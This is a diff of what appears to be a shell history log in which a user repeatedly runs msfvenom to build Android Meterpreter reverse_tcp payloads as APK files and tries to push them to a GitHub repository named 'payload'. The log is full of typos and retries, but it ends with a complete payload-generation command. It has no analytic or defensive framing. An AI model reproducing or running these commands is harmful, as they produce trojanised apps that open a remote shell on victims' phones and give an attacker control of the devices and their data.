@@ -104,3 +104,60 @@ git init
 git add .
 git commit -m "first commit" git branch -M main git remote add origin https://github.com/sillytuktuk2020/payload.git git push -u origin main 
 git commit -m "first commit" git branch -M main git remote add origin https://github.com/sillytuktuk2020/payload.git
+clear
+ls
+cd android_shell.apk
+ls
+git init 
+git remote add origin https://github.com/sillytuktuk2020/payload.git
+git add .
+git commit -m "modify"
+git config user.email "sillytuktuk2020@gmail.com"
+git config user.name "sillytuktuk2020"
+git commit -m "modify"
+git push -u origin master
+ls
+ifconfig
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14
+clear
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14
+clear
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14
+clear
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14
+exiy
+exit
+sudo apt-update
+sudo apt-get install update
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14
+iconfig
+ifconfig
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14
+msfvenom -p android/meterpreter/reverse_tcp lhost=172.31.75.14 lport=4444 -a --plateform android -arch dalvik -o mypayload.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31,75.14 LPORT=4343 -a --platform andorid --arch davlik -o vipin.apk
+exit
+clear
+ls
+git init 
+git commit -m "first commit" git branch -M main git remote add origin https://github.com/sillytuktuk2020/payload.git 
+git add .
+git commit -m "modify"
+git config user.email
+git config user.email "sillytuktuk2020@gmail.com"
+git config user.name "sillytuktuk2020"
+git push -u origin master
+git commit -m "modify"
+git push -u origin master
+git remote add origin https://github.com/sillytuktuk2020/payload.git 
+clear
+ls
+ifconfig
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14
+clear
+msfvenom -p android/meterpreter/reverse_tcp LHOST=172.31.75.14 LPORT=12345 -a --platform android --arch dalvik -o android_payload.apk
+ls
+rm android_shell.apk
+ls
+git init
+git remote add origin https://github.com/sillytuktuk2020/payload.git 
+exit
